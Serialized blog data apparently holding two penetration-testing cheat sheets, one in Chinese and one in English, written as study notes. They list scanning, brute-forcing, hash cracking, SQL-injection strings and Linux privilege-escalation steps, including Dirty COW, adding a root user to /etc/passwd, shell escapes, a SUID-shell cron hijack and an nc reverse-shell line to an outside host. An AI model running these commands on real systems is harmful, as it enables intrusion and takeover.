hash 类型，使用 hashcat 破解 hash\nhashcat -m 400 -a 0 &lt;hash file&gt; &lt;wordlist file&gt;\n# 对于其他服务，可以使用 Medusa 或 hydra\nHydra -L &lt;username file&gt; -P &lt;Password file&gt; -v &lt;ip-address&gt; ssh \nMedusa -h &lt;ip-address&gt; -U &lt;username file&gt; -P &lt;password file&gt; -M http -m DIR:/admin -T 30\n```\n***\n# 数据包抓取\n使用 wireshark / tcpdump 获取目标主机的流量\n```\ntcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv\n```\n\n\n***\n# 参考资料\nNMAP Cheatsheet\n&lt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&gt;\nExploit-DB\n&lt;https://www.exploit-db.com/&gt;\nKernel Exploits \n&lt;https://www.kernel-exploits.com/&gt;\nPrivilege Escalation Linux\n&lt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&gt;\n&lt;Linux Pentest Commands\n&lt;http://www.networkpentest.net/p/linuxunix-command-list.html&gt;\nWindows Command Line Cheatsheet\n&lt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&gt;\nPrivilege Escalation Windows:\n&lt;http://www.fuzzysecurity.com/tutorials/16.html&gt;\n&lt;http://toshellandback.com/2015/11/24/ms-priv-esc/&gt;\nWindows Priv Esc cheatsheet\n&lt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&gt;\nPentest References:\n&lt;http://www.vulnerabilityassessment.co.uk/&gt;\n&lt;http://www.0daysecurity.com/penetration-testing/enumeration.html&gt;\nReverse Shell:\n&lt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&gt;\n&lt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&gt;\n&lt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&gt;\n&lt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&gt;\nShell Escape:\n&lt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;http://pentestmonkey.net/category/cheat-sheet&gt;&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Common process for handling objectives.md&quot;],&quot;digest&quot;:[0,&quot;be8f31d7c603b057&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;nmap基本扫描\&quot;&gt;Nmap基本扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#nmap基本扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -vv&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap -Pn -p- -sU -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对端口指纹和漏洞的扫描\&quot;&gt;针对端口指纹和漏洞的扫描&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对端口指纹和漏洞的扫描\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 使用nc查看banner&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nc -nv &amp;#x3C;ip-address&gt; &amp;#x3C;port&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-端口的枚举\&quot;&gt;针对 web 端口的枚举&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-端口的枚举\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Nikto -port {web ports} -host &amp;#x3C;ip address&gt; -o &amp;#x3C;output file.txt&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 目录扫描&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Dirb http{s}://&amp;#x3C;ip address&gt;:&amp;#x3C;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Gobuster -u http://&amp;#x3C;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#如果想测试文件包含漏洞，可以使用 fimap：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;fimap -u &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;针对已知的服务进行攻击尝试，搜索漏洞信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对已知的服务进行攻击尝试搜索漏洞信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Searchsploit &amp;#x3C;service name&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;漏洞来源：\n&lt;a href=\&quot;https://www.securityfocus.com/vulnerabilities\&quot;&gt;https://www.securityfocus.com/vulnerabilities&lt;/a&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-web-页面的测试\&quot;&gt;针对 web 页面的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-web-页面的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget\n在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险\n检查 HTTP 选项&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;测试输入表单参数（比如 1&#39; or 1=1 limit 1; # AND 1&#39; or 1=1--）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● NULL 或 null&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, \&quot;, ;, &amp;#x3C;!&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● -, =, +, \&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于手工 SQL 注入测试&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● &#39;, &amp;#x26;, ! , ¦ , &amp;#x3C; , &gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 用于找出命令执行漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● ../&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  ○ 目录穿越漏洞&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-netbiossmbrpc-端口的测试\&quot;&gt;针对 NETBIOS、SMB、RPC 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-netbiossmbrpc-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;enum4linux -a &amp;#x3C;ip address&gt; Rpcclient &amp;#x3C;ip address&gt; -U \&quot;\&quot; -N Rpcinfo -p &amp;#x3C;target ip&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;关于 RPC 历史漏洞的合集：\n&lt;a href=\&quot;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/\&quot;&gt;http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/&lt;/a&gt;\n以下是常用的远程测试命令&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Showmount -e &amp;#x3C;ip address&gt;/&amp;#x3C;port&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Mount -t cifs //&amp;#x3C;server ip&gt;/&amp;#x3C;share&gt; &amp;#x3C;local dir&gt; -o username=”guest”,password=”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Rlogin &amp;#x3C;ip-address&gt; Smbclient -L &amp;#x3C;ip-address&gt; -U “” -N Nbtscan -r &amp;#x3C;ip address&gt; &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net use &amp;#x3C;ip-address&gt;$Share “” /u:”” &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Net view &amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-smtp-端口的尝试\&quot;&gt;针对 SMTP 端口的尝试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-smtp-端口的尝试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;枚举用户，使用 VRFY 和 EXPN 命令&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-snmp-端口的测试\&quot;&gt;针对 SNMP 端口的测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-snmp-端口的测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;默认共享名称如：public, private, cisco, manager\n使用工具：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Onesixtyone –c &amp;#x3C;community list file&gt; -I &amp;#x3C;ip-address&gt; Snmpwalk -c &amp;#x3C;community string&gt; -v&amp;#x3C;version&gt; &amp;#x3C;ip address&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 默认 MIB：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 比如枚举运行的进程&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;针对-ftp-端口测试\&quot;&gt;针对 FTP 端口测试&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#针对-ftp-端口测试\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● anonymous 是否可以登录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 如果可以登录是否可以使用 get 或 send 操作文件&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;● 使用浏览器是否可以访问，ftp://&amp;#x3C;ip-address&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;密码破解\&quot;&gt;密码破解&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#密码破解\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;unshadow [passwd-file] [shadow-file] &gt; unshadowed.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;hashcat -m 400 -a 0 &amp;#x3C;hash file&gt; &amp;#x3C;wordlist file&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 对于其他服务，可以使用 Medusa 或 hydra&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hydra -L &amp;#x3C;username file&gt; -P &amp;#x3C;Password file&gt; -v &amp;#x3C;ip-address&gt; ssh &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Medusa -h &amp;#x3C;ip-address&gt; -U &amp;#x3C;username file&gt; -P &amp;#x3C;password file&gt; -M http -m DIR:/admin -T 30&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;数据包抓取\&quot;&gt;数据包抓取&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#数据包抓取\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;使用 wireshark / tcpdump 获取目标主机的流量&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;tcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;参考资料\&quot;&gt;参考资料&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#参考资料\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;NMAP Cheatsheet\n&lt;a href=\&quot;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf\&quot;&gt;https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf&lt;/a&gt;\nExploit-DB\n&lt;a href=\&quot;https://www.exploit-db.com/\&quot;&gt;https://www.exploit-db.com/&lt;/a&gt;\nKernel Exploits\n&lt;a href=\&quot;https://www.kernel-exploits.com/\&quot;&gt;https://www.kernel-exploits.com/&lt;/a&gt;\nPrivilege Escalation Linux\n&lt;a href=\&quot;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/\&quot;&gt;https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/&lt;/a&gt;\n&amp;#x3C;Linux Pentest Commands\n&lt;a href=\&quot;http://www.networkpentest.net/p/linuxunix-command-list.html\&quot;&gt;http://www.networkpentest.net/p/linuxunix-command-list.html&lt;/a&gt;\nWindows Command Line Cheatsheet\n&lt;a href=\&quot;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf\&quot;&gt;https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf&lt;/a&gt;\nPrivilege Escalation Windows:\n&lt;a href=\&quot;http://www.fuzzysecurity.com/tutorials/16.html\&quot;&gt;http://www.fuzzysecurity.com/tutorials/16.html&lt;/a&gt;\n&lt;a href=\&quot;http://toshellandback.com/2015/11/24/ms-priv-esc/\&quot;&gt;http://toshellandback.com/2015/11/24/ms-priv-esc/&lt;/a&gt;\nWindows Priv Esc cheatsheet\n&lt;a href=\&quot;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html\&quot;&gt;http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html&lt;/a&gt;\nPentest References:\n&lt;a href=\&quot;http://www.vulnerabilityassessment.co.uk/\&quot;&gt;http://www.vulnerabilityassessment.co.uk/&lt;/a&gt;\n&lt;a href=\&quot;http://www.0daysecurity.com/penetration-testing/enumeration.html\&quot;&gt;http://www.0daysecurity.com/penetration-testing/enumeration.html&lt;/a&gt;\nReverse Shell:\n&lt;a href=\&quot;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/\&quot;&gt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&lt;/a&gt;\n&lt;a href=\&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;\n&lt;a href=\&quot;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html\&quot;&gt;http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html&lt;/a&gt;\n&lt;a href=\&quot;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/\&quot;&gt;http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/&lt;/a&gt;\nShell Escape:\n&lt;a href=\&quot;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells\&quot;&gt;https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells&lt;/a&gt;\nPentestmonkey Cheat Sheets (SQL Injection)\n&lt;a href=\&quot;http://pentestmonkey.net/category/cheat-sheet\&quot;&gt;http://pentestmonkey.net/category/cheat-sheet&lt;/a&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;nmap基本扫描&quot;],&quot;text&quot;:[0,&quot;Nmap基本扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;],&quot;text&quot;:[0,&quot;针对端口指纹和漏洞的扫描&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-端口的枚举&quot;],&quot;text&quot;:[0,&quot;针对 web 端口的枚举&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对已知的服务进行攻击尝试搜索漏洞信息&quot;],&quot;text&quot;:[0,&quot;针对已知的服务进行攻击尝试，搜索漏洞信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-web-页面的测试&quot;],&quot;text&quot;:[0,&quot;针对 web 页面的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-netbiossmbrpc-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 NETBIOS、SMB、RPC 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-smtp-端口的尝试&quot;],&quot;text&quot;:[0,&quot;针对 SMTP 端口的尝试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-snmp-端口的测试&quot;],&quot;text&quot;:[0,&quot;针对 SNMP 端口的测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;针对-ftp-端口测试&quot;],&quot;text&quot;:[0,&quot;针对 FTP 端口测试&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;密码破解&quot;],&quot;text&quot;:[0,&quot;密码破解&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;数据包抓取&quot;],&quot;text&quot;:[0,&quot;数据包抓取&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;参考资料&quot;],&quot;text&quot;:[0,&quot;参考资料&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Common process for handling objectives&quot;],&quot;date&quot;:[3,&quot;2026-02-05T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/11&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/mandatory-manual&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Mandatory manual&quot;],&quot;date&quot;:[3,&quot;2026-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n## Port scan\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -sV -O  -T4  --script vuln 192.168.124.44 -p-\n```\n\n\n## Web scan\n```\ndirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt\nnikto  -port 80 -host 192.168.124.44 -o nikto-result.txt\n```\n***\n# Vulnerability analysis\nUse nc to view banner.\n```\nnc -nv 192.168.124.44 22\n```\n```\nsearchsploit &lt;service name&gt;\nsearchsploit -m 47080\n```\n\n\n***\n# Exploitation\n\n## smb\n```\nenum4linux 192.168.124.40\nsmbclient -L 192.168.124.40\n```\n\n\n***\n# Privilege escalation\n## Linux \n### Kernel stack overflow\n```\nuname -a\ncat /etc/*-release\nsearchsploit linux 3.10 CentOS Linux 7\n```\nuse tools\n```\n./linux-exploit-suggester-2.pl\n```\nTake the rights of dirty-cow as an example\n```\ngcc -pthread dirty.c -lcrypt -o dirty\nchmod +x dirty\n./dirty fly\n```\n### Plain password of root\nIf /etc/passwd can be write by common user.\n```\nopenssl passwd -1 -salt hacker 123456\n```\ngenerate `$1$hacker$4o50Z4aoUGaLMC0Rg4Io40`\n```\necho &#39;hacker:$1$hacker$4o50Z4aoUGaLMC0Rg4Io40:0:0:/root:/bin/bash&#39; &gt;&gt; /etc/passwd\n```\nThen login in user hacker\n\nIf /etc/shadow can be read by common user.\n```\nunshadow /etc/passwd /etc/shadow &gt; shadow.txt\nchmod 777 shadow.txt\njohn --format=crypt --wordlist=/usr/share/john/password.lst shadow.txt\n```\n### Password reuse\n### Sudo abuse\n`sudo -l`\n&gt;https://gtfobins.github.io/\n\nFor example:`su,    awk,    man `\n```\nsudo su\n```\n```\nsudo awk &#39;BEGIN {system(\&quot;/bin/sh\&quot;)}&#39;\n```\n```\nsudo man man\n!/bin/sh\n```\n```\nsudo vim -c &#39;:!/bin/sh&#39;\n```\n### &#39;su root&#39; prohibited\n```\npython -c &#39;import pty;pty.spawn(\&quot;/bin/sh\&quot;)\nsudo su\n```\n### Scheduled task\n```\nls -l /etc/cron*\ncat /etc/crontab\n```\nIf there is a scheduled task named 1.py\n```\nls -al /tmp/1.py    //查看是否有w权限\n```\nWrite the code into 1.py\n```\nimport os \nos.system(&#39;cp /bin/sh /tmp/sh&#39;) \nos.system(&#39;chmod u+s /tmp/sh&#39;)\n```\n`./tmp/sh`\n### SUID\nTake nmap as an example:\n```\nfind / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null\n/usr/local/bin/nmap --interactive\n!sh\nwhoami\n```\n### Environment variable hijacking\nFind command with suid just as 4.1.7.\nSuppose it is `su`\n```\nvim /tmp/su         //write shellcode into su\nexport PATH=/tmp:$PATH\n```\n### Administrator configuration error\nConfiguring a program with SUID that does not have the setuid(0) code, such as `find `mentioned above.\n```\nmkdir abc\nfind abc -exec &#39;/bin/sh&#39; \\;\n```\n### Docker group\n### Service vulnerability\n```\nnetstat -antup\n```\nRedis reverse shell.\n```\nnc -l 12345 | nc 102.168.191.170 80\n```\n## Windows\n***\n# 5 Domain penetration&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/Mandatory manual.md&quot;],&quot;digest&quot;:[0,&quot;9a10681b2f297e3d&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;information-gathering\&quot;&gt;Information gathering&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#information-gathering\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;h2 id=\&quot;port-scan\&quot;&gt;Port scan&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#port-scan\&quot;&gt;&lt;span class=\&quot;icon 